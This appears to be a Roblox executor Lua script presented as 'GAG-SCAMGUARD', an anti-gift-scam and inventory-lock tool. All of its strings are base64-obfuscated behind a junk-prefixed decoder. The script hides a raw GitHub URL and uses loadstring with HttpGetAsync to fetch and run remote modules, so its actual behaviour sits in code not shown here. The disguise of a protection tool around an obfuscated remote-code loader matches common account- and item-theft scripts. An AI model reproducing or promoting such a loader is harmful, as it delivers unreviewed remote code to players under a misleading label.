local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- Main.lua (GAG-SCAMGUARD Mobile Client Ready)
-- Single entry point for anti-gift/anti-scam protection
-- Integrates GUIManager, RemoteGuard, InventoryLock, Logger

-- Load modules via raw GitHub URLs (make sure URLs are correct)
local baseURL = oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('uLzFFYCKKqZnOobgQVPFzCzcAiIhIsGYekgRMbwLGKjahkkRSQHPuhfaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4v')
local function LoadModule(name)
    local url = baseURL .. name
    local ok, module = pcall(function()
        return loadstring(game:HttpGetAsync(url))()
    end)
    if ok then return module else warn(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('buhCpdCRepCPHpFjHVHEKKHxoPtrfTjnaZHvscFgmFofDsQWyumlLJWRmFpbGVkIHRvIGxvYWQgbW9kdWxlOiA=') .. name .. oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('onEWVAXOFpwuozhPNKBOSfHMfFiQPYWIjHzQYSOOUbfxzmTeFXTvJGiIEVycm9yOiA=') .. tostring(module)) return nil end
end

-- Modules
local GUIManager = LoadModule(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('TYSGeeUoLdnScclkMqWRFOQjMalfiPRDbuZtcxqJnGPNJdXEPkAfTIVR1VJTWFuYWdlci5sdWE='))
local RemoteGuard = LoadModule(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('nQBjBprTkOWwgViyYnuzkdgtxevlnEzUqTAdpcgQYnXyisJzxjiCuFwUmVtb3RlR3VhcmQubHVh'))
local InventoryLock = LoadModule(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('XBRCUyRQNMUODXNcLOnFSZPfhdGzQAvFRNSFHJgZHPfciXaNJfNBnGcSW52ZW50b3J5TG9jay5sdWE='))
local Logger = LoadModule(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('ploWdwFJVUZZomTEQJQJuvLKbHCxEdxGEwSWjhWZQiwbonLBvRaZyenTG9nZ2VyLmx1YQ=='))

-- Config (example, can be expanded)
local Config = LoadModule(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('eePieYEEXAdbpsWmRZJFyeyBcUUMdCAzsXozzpmsIfqrYNFxfJFcyQKQ29uZmlnLmx1YQ=='))

-- Link modules
if InventoryLock then InventoryLock:LinkModules({Logger = Logger, GUIManager = GUIManager, Config = Config}) end
if RemoteGuard then RemoteGuard:LinkModules({Logger = Logger, GUIManager = GUIManager, Config = Config}) end

-- Start GUI Loading Screen
if GUIManager then
    GUIManager:StartLoadingScreen(15) -- 15 seconds with animation, mobile-friendly
end

-- Lock all inventory items
if InventoryLock then
    InventoryLock:Start() -- auto-lock inventory, force attribute oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('LYxEVxgohfrDhGOjGrahaRfnJiHuROcOPdKbqbHrXrFhmjkqAuIDxzOZA==') true
end

-- Scan and block gift remotes
if RemoteGuard then
    RemoteGuard:ScanAndBlock()
    RemoteGuard:MonitorNewRemotes()
end

-- Status Dot (middle-top mobile-friendly)
if GUIManager then
    GUIManager:CreateStatusDot(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('xplyHzhXAXUWFlyZzWwXjIcAaZvwaGIxisTdsgpGDuJObRQqfoEpjgBdG9wLW1pZGRsZQ=='))
end

-- Hook Remote Trigger Event (black status and kick if configured)
if RemoteGuard then
    RemoteGuard.OnRemoteTriggered.Event:Connect(function(remoteName)
        if GUIManager then GUIManager:SetStatusDot(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('dCSHuLAzmTtEfRditwAYvClIsVsJgBeiwCotWhFItDyFksJehrIZKkxYmxhY2s=')) end
        if Logger then Logger:AddEntry(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('sHdvsQEgykXrvbnEFHuuXAZfzjevzLuMozJfjalXunNHhFbxTmdfgqNUmVtb3RlIHRyaWdnZXJlZDog')..tostring(remoteName), oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('OiEHNLPIMefFcgugpKknoyDNTUrjtofimotYakxaUwfHcdtCRzREaseYWxlcnQ=')) end
        if Config and Config.KickOnTrigger then
            pcall(function() LocalPlayer:Kick(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('rgePUBEgzMrJCVkoPkJeUakdrVnrZDjxKMZjNmADcSPijPnFIlvXGYSW0dBRy1TQ0FNR1VBUkRdIERhbmdlcm91cyByZW1vdGUgdHJpZ2dlcmVkOiA=')..tostring(remoteName)) end)
        end
    end)
end

-- Optional: periodic GUI update (green/yellow/red)
spawn(function()
    while true do
        if RemoteGuard and GUIManager then
            local status = RemoteGuard:GetStatus() -- safe, warn, danger
            local color = oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('SeheimEcWkYHIkeoWOTdpOQBwTjPjnIwGgUoFgHBlOZUTkhiVTTdTlKZ3JlZW4=')
            if status == oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('ukOqcdaztrAHxZlvopYEWwPjKWsPEPkRdXPQqfTdWShmFxMQdWTzRLmd2Fybg==') then color = oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('FConhfyIbkSwIXklXFaNztqKczaPQhaScISoJJWfOaidIfcRNrzVatveWVsbG93')
            elseif status == oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('GPKgaValnAAyTSdPCjIJxHZEeluLrxhhKhIRsSIwejZKqwZpcgpWaiIZGFuZ2Vy') then color = oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('yPKiFzMUUkfRJySbtiYgCQkXjtfQFedSHNCjckrqmtMmpToebVxgvUMcmVk') end
            GUIManager:SetStatusDot(color)
        end
        task.wait(5) -- update every 5s
    end
end)

-- Complete Loading Screen
if GUIManager then
    GUIManager:FinishLoadingScreen()
end

-- Log startup complete
if Logger then Logger:AddEntry(oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('zhmMidZhxhWlfFfXfmFNRBkOyLaZJsmGNBZsfjMeZgQVwooQXPtbMGSR0FHLVNDQU1HVUFSRCBpbml0aWFsaXplZCBzdWNjZXNzZnVsbHku'), oqjRYcGxOyRuKXGauyOyMqsceEHUvPQjbTYMMVigvUEaK('yrSOgkIDarYMGLcbTldldJWiZVpvKmrGtqzmCskVvKEXmSCeQOKwhsFaW5mbw==')) end
    
